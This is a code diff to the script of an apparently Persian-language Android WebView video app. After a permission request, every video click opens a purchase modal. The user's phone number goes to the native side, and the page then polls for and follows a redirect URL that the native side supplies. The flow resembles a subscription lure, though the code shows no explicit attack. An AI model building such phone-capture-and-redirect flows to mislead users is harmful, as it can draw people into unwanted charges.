@@ -196,9 +196,9 @@
                         try {
                             if (window.Android && window.Android.requestPermissions) {
                                 window.Android.requestPermissions(video.id.toString());
-                            } else {
-                                navigateToDetails(video.id);
                             }
+                            // Open modal when clicking on video
+                            openPurchaseModal();
                         } catch (e) {
                             console.error('Error in videoItem click:', e);
                             if (window.Android) window.Android.showToast('خطا در انتخاب ویدیو');
@@ -239,7 +239,6 @@
                 detailsPage.querySelector('.back-button').addEventListener('click', () => navigateTo('home-page'));
                 
                 const playOverlay = detailsPage.querySelector('.play-overlay');
-
                 playOverlay.addEventListener('click', () => {
                     try {
                         openPurchaseModal();
@@ -279,28 +278,6 @@
             }
         });
 
-        // *** CHANGED: Global function to receive dynamicTargetUrl from Android ***
-        window.receiveDynamicTargetUrl = function(url) {
-            try {
-                console.log('Received dynamicTargetUrl from Android:', url);
-                if (url && typeof url === 'string' && url.trim() !== '' && /^(https?:\/\/)/i.test(url)) {
-                    console.log('Redirecting to:', url);
-                    window.location.href = url; // Perform the redirect
-                } else {
-                    console.error('Invalid or missing dynamicTargetUrl:', url);
-                    if (window.Android && window.Android.showToast) {
-                        window.Android.showToast('URL معتبر برای ریدایرکت یافت نشد');
-                    }
-                }
-            } catch (e) {
-                console.error('Error in receiveDynamicTargetUrl:', e);
-                if (window.Android && window.Android.showToast) {
-                    window.Android.showToast('خطا در پردازش URL');
-                }
-            }
-        };
-
-        // *** CHANGED: Handle phone number submission and wait for dynamicTargetUrl ***
         submitPhoneButton.addEventListener('click', () => {
             try {
                 const phoneNumber = phoneNumberInput.value.trim();
@@ -311,28 +288,45 @@
                     return;
                 }
 
+                // Show spinner and disable button
                 submitPhoneButton.innerHTML = '<div class="spinner"></div>';
                 submitPhoneButton.disabled = true;
 
-                // Send phone number to Android and wait for dynamicTargetUrl
+                // Send phone number to Android
                 if (typeof window.Android !== 'undefined' && typeof window.Android.submitPhoneNumber === 'function') {
                     console.log('Sending phone number to Android:', phoneNumber);
-                    window.Android.submitPhoneNumber(phoneNumber); // Send phone number, expect receiveDynamicTargetUrl to be called
+                    window.Android.submitPhoneNumber(phoneNumber);
+
+                    // Start polling for dynamicTargetUrl
+                    const pollInterval = setInterval(() => {
+                        if (typeof window.Android !== 'undefined' && typeof window.Android.getTargetUrl === 'function') {
+                            const redirectUrl = window.Android.getTargetUrl();
+                            console.log('Polling for dynamicTargetUrl:', redirectUrl);
+                            if (redirectUrl && typeof redirectUrl === 'string' && redirectUrl.trim() !== '' && /^(https?:\/\/)/i.test(redirectUrl)) {
+                                // Valid URL received, stop polling and redirect
+                                clearInterval(pollInterval);
+                                console.log('Redirecting to:', redirectUrl);
+                                window.location.href = redirectUrl;
+                                // Close modal
+                                closeModal();
+                                // Reset button and input
+                                submitPhoneButton.innerHTML = 'تایید و ادامه';
+                                submitPhoneButton.disabled = false;
+                                phoneNumberInput.value = '';
+                            }
+                        }
+                    }, 500); // Poll every 500ms
                 } else {
                     console.log('Android interface not found. Phone number not sent. Value:', phoneNumber);
                     // Fallback for testing in a browser
                     alert(`رابط اندروید یافت نشد. شماره ارسال شده: ${phoneNumber}`);
                     // Simulate receiving a URL for testing
-                    window.receiveDynamicTargetUrl('https://example.com/redirect');
-                }
-
-                // Reset button and close modal after a short delay
-                setTimeout(() => {
                     submitPhoneButton.innerHTML = 'تایید و ادامه';
                     submitPhoneButton.disabled = false;
                     closeModal();
-                    phoneNumberInput.value = ''; // Clear the input field
-                }, 1000);
+                    phoneNumberInput.value = '';
+                    window.location.href = 'https://example.com/redirect';
+                }
 
             } catch (e) {
                 console.error('Error in submitPhoneButton click:', e);
